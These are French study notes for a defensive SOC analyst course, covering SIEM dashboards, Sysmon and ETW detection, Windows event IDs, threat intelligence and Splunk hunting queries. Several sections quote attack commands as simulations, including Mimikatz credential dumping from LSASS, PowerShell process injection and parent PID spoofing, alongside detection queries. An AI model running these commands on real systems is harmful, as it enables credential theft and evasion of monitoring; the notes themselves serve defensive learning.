# Write up Cdsa

## **Incident Handling Process**

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%201.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%202.png)

## **Security Monitoring & SIEM Fundamentals**

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%203.png)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%204.png)

[View MITRE diagram](https://academy.hackthebox.com/storage/modules/211/MITRE.gif)

![image.png](Write%20up%20Cdsa%201e8252007eb480c08937f624571396d6/image%205.png)

## SIEM Visualization Example 1: Failed Logon Attempts (All Users)

```jsx
🧭 Étapes à suivre
1. Accéder au système cible

    Ouvrir l’outil SIEM à l’adresse : http://[IP Cible]:5601.

    Aller dans le menu Dashboard.

2. Modifier le Dashboard

    Cliquer sur l’icône en forme de crayon pour passer en mode édition.

    Sélectionner Create visualization pour créer une nouvelle visualisation.

3. Configurer la visualisation
🔍 Filtres

    Event ID : 4624 (connexions réussies).

    Type de connexion : RemoteInteractive via le champ winlog.logon.type.

📂 Index

    Utiliser l’index pattern windows* pour cibler les logs Windows.

✅ Vérification

    S’assurer que le champ user.name.keyword est bien présent dans les données.

📊 Type de visualisation

    Choisir le type Table.

4. Configurer la table
🔠 Lignes à afficher

    Compte de service : user.name (filtré avec svc-*).

    Machine cible : host.hostname.keyword.

    IP initiatrice : related.ip.keyword.

    Nombre d'événements : via l'agrégat count.

➕ Métrique

    Sélectionner count pour afficher le nombre total d'événements.

🔎 Requête KQL

user.name: svc-*

5. Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.
```

## **SIEM Visualization Example 2: Failed Logon Attempts (Disabled Users)**

```jsx
🧭 Étapes à suivre
1. Accéder au système cible

    Ouvrir l’outil SIEM à l’adresse : http://[IP Cible]:5601.

    Dans le menu latéral, cliquer sur Dashboard.

2. Modifier le Dashboard

    Cliquer sur l’icône en forme de crayon pour passer en mode édition.

    Cliquer sur Create visualization pour créer une nouvelle visualisation.

3. Configurer la visualisation
🔍 Filtres

    Event ID : 4625 (tentatives de connexion échouées).

    Sous-statut : winlog.event_data.SubStatus : 0xC0000072 pour identifier les connexions échouées dues à des comptes désactivés.

📂 Index Pattern

    Sélectionner windows* pour utiliser les logs Windows.

✅ Vérification

    Vérifier que le champ user.name.keyword est bien disponible dans les données.

📊 Type de visualisation

    Choisir le type Table.

4. Configurer le tableau
🔠 Champs à afficher

    Utilisateur désactivé : via user.name.

    Machine concernée : host.hostname.keyword.

    Nombre de tentatives : ajouter une métrique count pour compter les événements.

5. Enregistrer

    Cliquer sur Save and return pour ajouter la visualisation au dashboard.
```

## **SIEM Visualization Example 3: Successful RDP Logon Related To Service Accounts**

```jsx

### 🎯 Objectif

Créer une visualisation pour surveiller les connexions RDP réussies effectuées par des comptes de service dans un environnement Windows.

### 🧭 Étapes à suivre

#### 1. Accéder au système cible

* Se rendre sur l’interface SIEM à l’adresse : `http://[IP Cible]:5601`.
* Ouvrir le menu latéral et cliquer sur **Dashboard**.

#### 2. Modifier le Dashboard

* Cliquer sur l’icône **crayon** pour activer le mode édition.
* Sélectionner **Create visualization** pour démarrer la création.

#### 3. Configurer la visualisation

##### 🔍 Filtres

* **Event ID** : `4624` (connexions réussies).
* **Type de logon** : `RemoteInteractive` via le champ `winlog.logon.type`.

##### 📂 Index Pattern

* Utiliser `windows*` pour filtrer les logs liés à Windows.

##### ✅ Vérification

* Confirmer que le champ `user.name.keyword` est bien présent dans les données.

##### 📊 Type de visualisation

* Choisir le type **Table**.

#### 4. Configurer le tableau

##### 🔠 Champs à afficher

* **Compte de service** : `user.name` (avec un filtre `svc-*`).
* **Machine cible** : `host.hostname.keyword`.
* **IP source** : `related.ip.keyword`.
* **Nombre d’événements** : utiliser la métrique **count**.

##### ➕ Métrique

* Ajouter **count** pour afficher le nombre total de connexions.

##### 🔎 Requête KQL

kql
user.name: svc-*

#### 5. Enregistrer

* Cliquer sur **Save and return** pour enregistrer et revenir au tableau de bord.

```

## **SIEM Visualization Example 4: Users Added Or Removed From A Local Group (Within A Specific Timeframe)**

```jsx
🧭 Étapes à suivre
1. Accéder au système cible

    Ouvrir l’outil SIEM via l’adresse : http://[IP Cible]:5601.

    Dans la navigation latérale, sélectionner Dashboard.

2. Modifier le Dashboard

    Cliquer sur l’icône crayon pour passer en mode édition.

    Cliquer sur Create visualization pour commencer.

3. Configurer la visualisation
🔍 Filtres

    Event IDs : 4732 (ajout d’un utilisateur au groupe) et 4733 (suppression d’un utilisateur du groupe).

    Restreindre aux événements liés au groupe Administrators via group.name.keyword.

📂 Index Pattern

    Utiliser windows* pour cibler les journaux Windows.

✅ Vérification

    S’assurer que le champ user.name.keyword est disponible dans les données.

📊 Type de visualisation

    Sélectionner le type Table.

4. Configurer le tableau
🔠 Champs à afficher

    Utilisateur concerné : winlog.event_data.MemberSid.keyword.

    Groupe cible : group.name.keyword (doit être "Administrators").

    Action effectuée : event.action.keyword (ajout ou suppression).

    Machine impliquée : host.name.keyword.

    Nombre d’événements : ajouter la métrique count.

5. Définir la période

    Appliquer un filtre de date allant du 5 mars 2023 jusqu’à la date actuelle.
```

## **Windows Event Logs & Finding Evil**

## Analyzing Evil With Sysmon & Event Logs

```jsx
### ⚙️ Introduction à Sysmon

**Sysmon** (System Monitor) est un outil Windows qui journalise en détail l'activité du système grâce à trois composants principaux :

- **Service Windows** : surveille les actions système.
- **Pilote noyau** : capture les données.
- **Journal d’événements** : affiche les activités détectées.

### 📌 Événements Sysmon courants :

- **ID 1** : Création de processus
- **ID 3** : Connexion réseau

La configuration se fait via un fichier XML permettant d’inclure ou d’exclure des événements selon des critères précis (nom de processus, IP, etc.).

**Configurations recommandées :**

- SwiftOnSecurity Sysmon Config
- Olaf Hartong Modular Config

### ▶️ Installation (droits administrateur requis) :

C:\Tools\Sysmon> sysmon.exe -i -accepteula -h md5,sha256,imphash -l -n

### 📂 Appliquer une configuration personnalisée :

C:\Tools\Sysmon> sysmon.exe -c fichier.xml

---

### 🔍 Cas de détection

### 1️⃣ **Détection de DLL Hijacking**

Utilise l’**Event ID 7** (chargement de modules).

### Étapes :

- Vérifier dans le fichier `sysmonconfig-export.xml` que les événements de type module load ne sont pas exclus.
- Surveiller via : *Event Viewer > Applications and Services > Microsoft > Windows > Sysmon*.

### 🧪 Indicateurs de compromission :

- `calc.exe` exécuté depuis un répertoire en écriture
- `WININET.dll` chargé en dehors de `System32`
- DLL signée Microsoft remplacée par une version non signée

---

### 2️⃣ **Détection d’injection PowerShell/C# dans processus non-managés**

Surveille l’exécution anormale de code managé dans des processus natifs.

### Signes à observer :

- Chargement de `clr.dll` ou `clrjit.dll` dans des processus qui n’utilisentt normalement pas .NET
- Analyse des processus via *Process Hacker*

### 🧬 Exemple d’injection :

powershell
powershell -ep bypass
Import-Module .\Invoke-PSInject.ps1
Invoke-PSInject -ProcId [PID] -PoshCode "Write-Host 'Hello, World!'"

> Event ID 7 peut montrer les DLLs .NET chargées dans des contextes inhabituels.
> 

---

### 3️⃣ **Détection de vol d’identifiants (ex. : Mimikatz)**

Cible le processus **LSASS** pour l’extraction de mots de passe.

### Surveillance :

- **Event ID 10** : accès à des processus sensibles comme LSASS.

### 🔎 Indicateurs :

- Processus aléatoires accédant à LSASS
- `SourceUser` différent de `TargetUser` (ex. : waldo accédant à SYSTEM)
- Requêtes de privilège `SeDebugPrivilege`

### 📌 Exemple Mimikatz :

C:\Tools\Mimikatz> mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

```

## Event Tracing for Windows (ETW)

```jsx
### 🧠 Vue d’ensemble : Event Tracing for Windows (ETW)

**ETW (Event Tracing for Windows)** est un outil de journalisation haute performance intégré à Windows. Il permet de tracer dynamiquement les événements du système en temps réel, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :

- La détection d’anomalies
- L’analyse des incidents de sécurité
- Les investigations forensic détaillées

ETW couvre un large spectre : appels système, création/terminaison de processus, activité réseau, changements de fichiers/registre, etc.

---

### 🧩 Composants clés d’ETW

### 🎮 Controllers

- Gèrent les sessions ETW (démarrage, arrêt, activation des fournisseurs)
- **Exemple :**

logman.exe query -ets

### 📤 Providers

- Génèrent les événements
- 4 types :
    - **MOF Providers** : Basés sur le Managed Object Format
    - **WPP Providers** : Tracing côté noyau via annotations dans le code
    - **Manifest-based** : Définis via XML
    - **TraceLogging** : Fournisseurs modernes simplifiés

### 📥 Consumers

- Souscrivent à des événements précis (souvent stockés en fichiers `.ETL`)

### 📁 Channels

- Regroupent les événements de manière logique, facilitant l’abonnement sélectif

### 💾 ETL Files

- Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

---

### 🛠️ Interagir avec ETW

### 📌 Commandes via `logman`

- **Lister les sessions actives**

logman.exe query -ets

- **Voir les détails d’une session spécifique**

logman.exe query "EventLog-System" -ets

- **Lister tous les providers disponibles**

logman.exe query providers

### 🖥️ Interfaces graphiques

- **Performance Monitor** : Visualise et gère les sessions ETW
- **EtwExplorer** : Inspecte les métadonnées des providers ETW

---

### 🧩 Providers utiles en cybersécurité

| Provider | Fonction |
| --- | --- |
| `Microsoft-Windows-Kernel-Process` | Activité de processus (injection, hollowing) |
| `Microsoft-Windows-Kernel-File` | Surveillance des fichiers (exfiltration, ransomware) |
| `Microsoft-Windows-Kernel-Network` | Activité réseau suspecte |
| `Microsoft-Windows-SMBClient` / `SMBServer` | Suivi du trafic SMB (mouvement latéral) |
| `Microsoft-Windows-DotNETRuntime` | Exécution .NET potentiellement malveillante |
| `Microsoft-Windows-PowerShell` | Traces d’activité PowerShell |
| `Microsoft-Windows-TerminalServices-LocalSessionManager` | Détection d’accès RDP |

---

### 🔒 Provider restreint : Microsoft-Windows-Threat-Intelligence

- Fournisseur avancé nécessitant des **droits privilégiés (PPL)**
- Utilisé en **DFIR** (Digital Forensics & Incident Response) pour identifier :
    - Les menaces sophistiquées
    - Leur origine, impact, et interaction
- Peut être activé via contournements spécifiques, mais reste sensible
```

## Tapping Into ETW

```jsx
### 🧠 Vue d’ensemble : Event Tracing for Windows (ETW)

**ETW (Event Tracing for Windows)** est un outil de journalisation haute performance intégré à Windows. Il permet de tracer dynamiquement les événements du système en temps réel, tant depuis les applications en mode utilisateur que les pilotes en mode noyau.

Il est essentiel pour :

- La détection d’anomalies
- L’analyse des incidents de sécurité
- Les investigations forensic détaillées

ETW couvre un large spectre : appels système, création/terminaison de processus, activité réseau, changements de fichiers/registre, etc.

---

### 🧩 Composants clés d’ETW

### 🎮 Controllers

- Gèrent les sessions ETW (démarrage, arrêt, activation des fournisseurs)
- **Exemple :**

logman.exe query -ets

### 📤 Providers

- Génèrent les événements
- 4 types :
    - **MOF Providers** : Basés sur le Managed Object Format
    - **WPP Providers** : Tracing côté noyau via annotations dans le code
    - **Manifest-based** : Définis via XML
    - **TraceLogging** : Fournisseurs modernes simplifiés

### 📥 Consumers

- Souscrivent à des événements précis (souvent stockés en fichiers `.ETL`)

### 📁 Channels

- Regroupent les événements de manière logique, facilitant l’abonnement sélectif

### 💾 ETL Files

- Format durable pour stocker les traces ETW (analyse hors-ligne, archivage)

---

### 🛠️ Interagir avec ETW

### 📌 Commandes via `logman`

- **Lister les sessions actives**

logman.exe query -ets

- **Voir les détails d’une session spécifique**

logman.exe query "EventLog-System" -ets

- **Lister tous les providers disponibles**

logman.exe query providers

### 🖥️ Interfaces graphiques

- **Performance Monitor** : Visualise et gère les sessions ETW
- **EtwExplorer** : Inspecte les métadonnées des providers ETW

---

### 🧩 Providers utiles en cybersécurité

| Provider | Fonction |
| --- | --- |
| `Microsoft-Windows-Kernel-Process` | Activité de processus (injection, hollowing) |
| `Microsoft-Windows-Kernel-File` | Surveillance des fichiers (exfiltration, ransomware) |
| `Microsoft-Windows-Kernel-Network` | Activité réseau suspecte |
| `Microsoft-Windows-SMBClient` / `SMBServer` | Suivi du trafic SMB (mouvement latéral) |
| `Microsoft-Windows-DotNETRuntime` | Exécution .NET potentiellement malveillante |
| `Microsoft-Windows-PowerShell` | Traces d’activité PowerShell |
| `Microsoft-Windows-TerminalServices-LocalSessionManager` | Détection d’accès RDP |

---

### 🔒 Provider restreint : Microsoft-Windows-Threat-Intelligence

- Fournisseur avancé nécessitant des **droits privilégiés (PPL)**
- Utilisé en **DFIR** (Digital Forensics & Incident Response) pour identifier :
    - Les menaces sophistiquées
    - Leur origine, impact, et interaction
- Peut être activé via contournements spécifiques, mais reste sensible
```

## Get-WinEvent

### 🧠 Vue d’ensemble : Détections avancées via ETW

**Event Tracing for Windows (ETW)** permet une visibilité approfondie sur les événements système, allant au-delà des journaux classiques. Couplé à des outils comme **SilkETW**, il permet de détecter des tactiques avancées telles que la falsification de hiérarchie de processus ou le chargement de DLL .NET en mémoire.

---

### 🔍 Détection 1 : Relations parent-enfant anormales

Des processus comme `calc.exe` lançant `cmd.exe` peuvent indiquer une activité malveillante. Ces relations peuvent être explorées avec **Process Hacker**.

### 🎭 Simulation d’attaque : *Parent PID Spoofing*

Les attaquants peuvent forger une relation parent/enfant avec un PID falsifié.

```powershell
powershell -ep bypass
Import-Module .\psgetsys.ps1
[MyProcess]::CreateProcessFromParent([PID], "C:\Windows\System32\cmd.exe", "")

```

### 📈 Détection avec SilkETW

Pour tracer correctement ces relations :

```
SilkETW.exe -t user -pn Microsoft-Windows-Kernel-Process -ot file -p C:\windows\temp\etw.json

```

---

### 🧬 Détection 2 : Chargement de DLL .NET malveillantes en mémoire

Les attaquants utilisent des assemblages .NET chargés uniquement en mémoire pour contourner l’antivirus et la détection disque (tactique **BYOL – Bring Your Own Land**).

### 🧪 Simulation : Chargement mémoire d’un outil comme *Seatbelt*

Ce type d’attaque charge des bibliothèques comme :

- `clr.dll`
- `mscoree.dll`

Sysmon Event ID 7 détecte les DLL, mais **ne capture pas l’ensemble du comportement .NET**.

### 📈 Détection avec SilkETW + Provider .NET

Pour capturer les activités .NET runtime :

```
SilkETW.exe -t user -pn Microsoft-Windows-DotNETRuntime -uk 0x2038 -ot file -p C:\windows\temp\etw.json

```

🧩 **Mots-clés d’intérêt (Keywords)** :

- `JitKeyword` : Compilation Just-In-Time
- `InteropKeyword` : Interactions entre code managé/non-managé
- `LoaderKeyword` : Chargement dynamique d’assemblies
- `NGenKeyword` : Assemblies précompilés

## event ID

<aside>
💡

| **Event ID** | **Log Type** | **Catégorie** | **Description** |
| --- | --- | --- | --- |
| **1074** | System | Shutdown / Restart | Indique un redémarrage ou arrêt du système, avec raison. |
| **6005** | System | Service Start | Démarrage du service Event Log (souvent lors du boot). |
| **6006** | System | Service Stop | Arrêt du service Event Log (souvent lors de l’arrêt). |
| **6013** | System | Uptime | Indique le temps de fonctionnement de Windows en secondes. |
| **7040** | System | Service Configuration | Modification du type de démarrage d’un service. |
| **7045** | System | Service Installation | Un nouveau service a été installé (souvent utilisé par des malwares). |

| **Event ID** | **Log Type** | **Catégorie** | **Description** |
| --- | --- | --- | --- |
| **1102** | Security | Audit Log | Les logs de sécurité ont été effacés (souvent utilisé pour couvrir ses traces). |
| **1116** | Security | Antivirus | Détection de malware par l’antivirus. |
| **1118** | Security | Antivirus | Début de la remédiation antivirus. |
| **1119** | Security | Antivirus | Remédiation antivirus réussie. |
| **1120** | Security | Antivirus | Remédiation antivirus échouée. |
| **4624** | Security | Logon | Connexion réussie. |
| **4625** | Security | Logon | Connexion échouée (possibles attaques brute force). |
| **4648** | Security | Logon | Connexion avec des identifiants explicites (souvent utilisé en déplacement latéral). |
| **4656** | Security | Access Control | Requête d’accès à un objet (fichier, clé registre…). |
| **4672** | Security | Privileges | Attribution de privilèges spéciaux (administrateurs). |
| **4698** | Security | Scheduled Task | Une tâche planifiée a été créée. |
| **4700** | Security | Scheduled Task | Une tâche planifiée a été activée. |
| **4701** | Security | Scheduled Task | Une tâche planifiée a été désactivée. |
| **4702** | Security | Scheduled Task | Une tâche planifiée a été modifiée. |
| **4719** | Security | Audit Policy | Modification de la stratégie d’audit. |
| **4738** | Security | Account Management | Modification d’un compte utilisateur. |
| **4771** | Security | Kerberos | Échec d’authentification Kerberos. |
| **4776** | Security | Credential Validation | Validation de mot de passe par le contrôleur de domaine. |
| **5001** | Security | Antivirus Settings | Modification de la configuration de protection en temps réel. |
| **5140** | Security | Network Share | Accès à un partage réseau. |
| **5142** | Security | Network Share | Création d’un nouveau partage réseau. |
| **5145** | Security | Network Share | Tentative d’accès à un fichier/dossier partagé. |
| **5157** | Security | Network Filtering | Connexion réseau bloquée par le pare-feu. |

</aside>

## **Introduction to Threat Hunting & Hunting With Elastic**

```jsx

---

### 🔍 **Qu’est-ce que le Cyber Threat Intelligence (CTI) ?**

Le CTI (Cyber Threat Intelligence) désigne l’ensemble des informations analysées sur les menaces cyber permettant d’**anticiper, détecter, comprendre et répondre aux attaques**. Son objectif est de **passer d’une posture défensive réactive à une posture proactive**.

---

### 🧱 **Les 4 piliers du CTI efficace :**

1. **Pertinence** : L’information doit concerner l’environnement ou les partenaires de l’entreprise.
2. **Temporalité** : L’information doit être transmise rapidement – elle perd de la valeur avec le temps.
3. **Actionnabilité** : Elle doit pouvoir être utilisée immédiatement pour renforcer la défense.
4. **Exactitude** : L'information doit être vérifiée. Sinon, on indique un niveau de confiance.

---

### 🆚 **CTI vs. Threat Hunting :**

| **CTI (Prédictif)**                                     | **Threat Hunting (Proactif & Réactif)**               |
| ------------------------------------------------------- | ----------------------------------------------------- |
| Anticiper l’adversaire (où, quand, comment, pourquoi ?) | Rechercher la présence de l’adversaire dans le réseau |
| Sert à prédire les attaques                             | Sert à détecter des menaces existantes ou passées     |
| Partage d'infos avec les hunters                        | S'appuie sur le CTI pour orienter les recherches      |

---

### 🧠 **Utilité du CTI :**

* Compréhension des menaces ciblant l’organisation.
* Aide à la prise de décision stratégique (réduction du risque).
* Mise en place de plans d’action en cas de crise.

---

### 📊 **Les 3 niveaux de Cyber Threat Intelligence :**

1. **Stratégique**

   * Pour les dirigeants (C-suite, VPs)
   * Répond au **"Qui ?"** et **"Pourquoi ?"**
   * Ex : rapports sur APT28, motivations, cibles, historique

2. **Opérationnel**

   * Pour les managers intermédiaires
   * Répond au **"Comment ?"** et **"Où ?"**
   * Ex : tactiques détaillées d’un groupe comme REvil

3. **Tactique**

   * Pour les analystes et défenseurs réseau
   * Fournit des IOCs : IPs, domaines, hashes, etc.
   * Utilisé dans les outils de détection (SIEM, EDR, IDS/IPS)

---

### 📑 **Lire un rapport de CTI tactique – Étapes clés :**

1. **Comprendre le contexte** du rapport (secteur ciblé, objectif).
2. **Identifier et classifier les IOCs** (réseau, hôte, email, etc.).
3. **Comprendre le cycle de vie de l’attaque** (souvent mappé au MITRE ATT\&CK).
4. **Vérifier les IOCs** (via VirusTotal, OTX, etc.) pour éviter les faux positifs.
5. **Implémenter les IOCs** dans l’infrastructure (SIEM, firewall, EDR…).
6. **Chasser les menaces activement** (Threat Hunting basé sur les IOCs et TTPs).
7. **Surveiller et apprendre en continu**, tout en partageant de nouvelles infos.

```

## **Understanding Log Sources & Investigating with Splunk**

## Toutes les commandes

```jsx

---

## 🔍 **Commandes de base Splunk**

### 🔹 **Recherche simple**

spl
search index="main" "UNKNOWN"

### 🔹 **Opérateurs booléens et de comparaison**

spl
index="main" EventCode!=1

---

## 📄 **Manipulation de champs**

### ✅ **`fields`** – Inclure/exclure des champs

spl
fields - User

### ✅ **`rename`** – Renommer des champs

spl
rename Image as Process

### ✅ **`eval`** – Créer ou modifier un champ

spl
eval Process_Path=lower(Image)

### ✅ **`rex`** – Extraire via regex

spl
rex max_match=0 "[^%](?<guid>{.*})"

---

## 📊 **Affichage et tri**

### ✅ **`table`** – Afficher des champs spécifiques

spl
table _time, host, Image

### ✅ **`dedup`** – Supprimer les doublons

spl
dedup Image

### ✅ **`sort`** – Trier les résultats

spl
sort - _time

---

## 📈 **Statistiques et visualisation**

### ✅ **`stats`** – Agrégations statistiques

spl
stats count by _time, Image

### ✅ **`chart`** – Graphiques/agrégats visuels

spl
chart count by _time, Image

---

## 📚 **Lookups et enrichissement**

### ✅ **`lookup`** – Croiser avec une source externe

spl
lookup malware_lookup.csv filename OUTPUTNEW is_malware

### ✅ **`inputlookup`** – Lire un fichier de lookup

spl
| inputlookup malware_lookup.csv

---

## ⏱️ **Filtrage temporel**

spl
index="main" earliest=-7d EventCode!=1

---

## 🔄 **Recherche avancée**

### ✅ **`transaction`** – Grouper des événements liés

spl
transaction Image startswith=eval(EventCode=1) endswith=eval(EventCode=3) maxspan=1m

### ✅ **Subsearch** – Requête imbriquée

spl
index="main" EventCode=1 NOT [ search ... ]

---

## 🧰 **Découverte de données**

* **Lister les index**

spl
| eventcount summarize=false index=* | table index

* **Lister les sourcetypes**

spl
| metadata type=sourcetypes

* **Afficher les logs bruts**
spl
sourcetype="WinEventLog:Security" | table _raw

---

## 📊 **Data Models & Pivot**

* **Data Models** : Modèle structuré de données Splunk (base des CIM).
* **Pivot** : Interface graphique pour requêtes sans écrire du SPL.

---

```

## **Intrusion Detection With Splunk (Real-world Scenario)**

```jsx
## 🧠 **Introduction**

- Passage de l’analyse de logs individuels à la **surveillance réseau complète**.
- Utilisation des **Windows Event Logs multi-machines** pour détecter les activités malveillantes.
- Objectif : **filtrer les faux positifs** et créer des **requêtes précises** pour générer des alertes fiables.

---

## 📥 **Sources de Données**

### ✅ Données à ingérer :

- **BOTS (Boss of the SOC)** – Fournies par Splunk.
- **logs.to** – Génére des logs JSON factices.
    
    ➤ À configurer avec `Indexed Extractions = JSON`.
    

### 🔍 Exemple de requête pour tout afficher :

index="main" earliest=0

> Plus de 500 000 événements simulés, avec divers types d’attaques et infections.
> 

---

## ⚙️ **Techniques de Recherche Efficaces**

### 🎯 Comparaison de recherches :

- **Recherche générale** :

index="main" uniwaldo.local

- **Recherche par wildcard** (moins performante) :

index="main" *uniwaldo.local*

- **Recherche ciblée par champ** (optimisée) :

index="main" ComputerName="*uniwaldo.local"

---

## 🔐 **Événements Sysmon à surveiller**

| **Event ID** | **Signification** |
| --- | --- |
| 1 | Création de processus (parent/enfant anormaux) |
| 3 | Connexions réseau (bruyant mais utile) |
| 5 | Fin de processus (kill suspects) |
| 6 | Chargement de driver (BYOD, rootkits) |
| 10 | Accès mémoire (dump, injection, lsass) |
| 25 | Détournement de processus (tampering) |

### 🔎 Exemple - Parent/Child suspects :

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 | stats count by ParentImage, Image

---

## 🌐 **Détection Avancée & IP Suspectes**

### 🔍 Exemple de recherche IP :

index="main" 10.0.0.229 | stats count by sourcetype

> Permet d’identifier des connexions sortantes potentiellement malveillantes.
> 

### 🔑 Dumping de credentials (lsass) :

index="main" EventCode=10 lsass | stats count by SourceImage

---

## 🚨 **Création d’Alertes Précises**

### Étapes :

1. **Détection des appels UNKNOWN :**

index="main" CallTrace="*UNKNOWN*" | stats count by EventCode

1. **Filtrage des faux positifs (JIT, .NET, wow64, etc.) :**

index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*ni.dll*" CallTrace!=*clr.dll*" CallTrace!=*wow64*" | where SourceImage!=TargetImage | stats count by SourceImage

1. **Exclusion d’Explorer.exe et regroupement complet :**

index="main" CallTrace="*UNKNOWN*" SourceImage!="*Microsoft.NET*" CallTrace!=*ni.dll*" CallTrace!=*clr.dll*" CallTrace!=*wow64*" SourceImage!="C:\Windows\Explorer.EXE" | where SourceImage!=TargetImage | stats count by SourceImage, TargetImage, CallTrac

> Produit une alerte fiable sur les anomalies réelles.
>
```

## **Detecting Attacker Behavior With Splunk Based On TTPs**

```jsx
## 🛡️ Détection des Tactiques, Techniques et Procédures (TTPs) dans Splunk

En cybersécurité, **identifier les TTPs** des attaquants est essentiel pour détecter efficacement les menaces. Cela implique de repérer des **comportements connus malveillants** ou des **anomalies inhabituelles**.

### 🧭 Deux approches complémentaires :

1. **TTPs connus** : utiliser des comportements d'attaque documentés pour créer des règles de détection précises.
2. **Détection d'anomalies** : repérer des schémas inhabituels via des analyses statistiques, sans connaissance préalable de l'attaque.

Le bon équilibre entre ces deux méthodes permet une couverture large et efficace. Des ajustements réguliers des requêtes et des seuils sont nécessaires pour affiner les résultats et limiter les faux positifs.

---

## 🔍 Exemples de Recherches SPL Basées sur des TTPs Connus

### 🔎 Reconnaissance via binaires Windows natifs

Les outils comme `ipconfig.exe`, `net.exe`, ou `whoami.exe` sont souvent utilisés par les attaquants pour l’exploration initiale.

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1 Image=*\ipconfig.exe OR Image=*\net.exe OR Image=*\whoami.exe OR Image=*\netstat.exe OR Image=*\nbtstat.exe OR Image=*\hostname.exe OR Image=*\tasklist.exe
| stats count by Image, CommandLine
| sort - count

---

### 🌐 Téléchargement malveillant depuis des domaines réputés (ex: GitHub)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=22 QueryName="*github*"
| stats count by Image, QueryName

---

### ⚙️ Utilisation suspecte de PsExec

**Cas 1 – Écriture dans la base de registre :**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=13 Image="C:\Windows\system32\services.exe" TargetObject="HKLM\System\CurrentControlSet\Services\*\ImagePath"
| rex field=Details "(?<reg_file_name>[^\\]+)$"
| eval file_name = if(isnull(file_name),reg_file_name,lower(file_name))
| stats values(Image) AS Image, values(Details) AS RegistryDetails, values(_time) AS EventTimes, count by file_name, ComputerName

**Cas 2 – Fichiers suspects (Event ID 11)**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image=System
| stats count by TargetFilename

**Cas 3 – Nom de pipe inter-process suspect (Event ID 18)**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=18 Image=System
| stats count by PipeName

---

### 📦 Utilisation d’archives pour l’exfiltration ou le transfert

index="main" EventCode=11 (TargetFilename="*.zip" OR TargetFilename="*.rar" OR TargetFilename="*.7z")
| stats count by ComputerName, User, TargetFilename
| sort - count

---

### 📥 Téléchargements via PowerShell ou Edge

**PowerShell**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*powershell.exe*"
| stats count by Image, TargetFilename
| sort + count

**Microsoft Edge (Zone.Identifier)**

index="main" sourcetype="WinEventLog:Sysmon" EventCode=11 Image="*msedge.exe" TargetFilename=*"Zone.Identifier"
| stats count by TargetFilename
| sort + count

---

### 🚫 Exécution depuis des emplacements inhabituels

index="main" EventCode=1
| regex Image="C:\\Users\\.*\\Downloads\\.*"
| stats count by Image

---

### ❗ Exécutables créés hors du répertoire Windows

index="main" EventCode=11 (TargetFilename="*.exe" OR TargetFilename="*.dll") TargetFilename!="*\windows\*"
| stats count by User, TargetFilename
| sort + count

---

### ✏️ Détection de binaires mal orthographiés (ex: psexe au lieu de PsExec)

index="main" sourcetype="WinEventLog:Sysmon" EventCode=1
(CommandLine="*psexe*.exe" NOT (CommandLine="*PSEXESVC.exe" OR CommandLine="*PsExec64.exe"))
OR (ParentCommandLine="*psexe*.exe" NOT (ParentCommandLine="*PSEXESVC.exe" OR ParentCommandLine="*PsExec64.exe"))
OR (ParentImage="*psexe*.exe" NOT (ParentImage="*PSEXESVC.exe" OR ParentImage="*PsExec64.exe"))
OR (Image="*psexe*.exe" NOT (Image="*PSEXESVC.exe" OR Image="*PsExec64.exe"))
| table Image, CommandLine, ParentImage, ParentCommandLine

---

### 📡 Ports non standards (commandes ou tunnels suspects)

index="main" EventCode=3
NOT (DestinationPort=80 OR DestinationPort=443 OR DestinationPort=22 OR DestinationPort=21)
| stats count by SourceIp, DestinationIp, DestinationPort
| sort - count

---
```

## **Detecting Attacker Behavior With Splunk Based On Analytics**

```jsx

---

### Détection d'anomalies dans Splunk : Identifier les comportements inhabituels

Dans le domaine de la cybersécurité, la détection basée sur les anomalies est essentielle pour identifier des comportements suspects qui échappent aux méthodes classiques fondées sur les TTP (Tactics, Techniques, and Procedures). En profilant l’activité normale d’un système, Splunk permet, grâce à des commandes statistiques comme `streamstats`, de repérer les écarts significatifs qui pourraient indiquer une compromission.

---

#### **Exemple 1 : Détection de connexions réseau anormales avec `streamstats`**

Cette requête surveille la fréquence des connexions réseau par processus. Elle signale ceux qui dépassent un seuil statistique basé sur leur comportement historique.

spl
index="main" sourcetype="WinEventLog:Sysmon" EventCode=3
| bin _time span=1h
| stats count as NetworkConnections by _time, Image
| streamstats time_window=24h avg(NetworkConnections) as avg stdev(NetworkConnections) as stdev by Image
| eval isOutlier=if(NetworkConnections > (avg + 0.5 * stdev), 1, 0)
| search isOutlier=1

**Explication** :

* `streamstats` calcule la moyenne et l’écart-type glissants sur 24h.
* Un processus est signalé s’il dépasse la moyenne de plus de 0,5 écart-type.

---

#### **Exemple 2 : Détection de commandes anormalement longues**

Des lignes de commande très longues peuvent indiquer des tentatives d’évasion ou d’obfuscation.

spl
index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

Pour affiner les résultats, on peut exclure les processus parent bénins :

spl
index="main" sourcetype="WinEventLog:Sysmon" Image=*cmd.exe 
ParentImage!="*msiexec.exe" ParentImage!="*explorer.exe"
| eval len=len(CommandLine)
| table User, len, CommandLine
| sort - len

---

#### **Exemple 3 : Activité inhabituelle de cmd.exe par utilisateur**

Ce cas détecte une augmentation soudaine de l’utilisation de cmd.exe pour un utilisateur donné.

spl
index="main" EventCode=1 (CommandLine="*cmd.exe*")
| bucket _time span=1h
| stats count as cmdCount by _time User CommandLine
| eventstats avg(cmdCount) as avg stdev(cmdCount) as stdev
| eval isOutlier=if(cmdCount > avg + 1.5 * stdev, 1, 0)
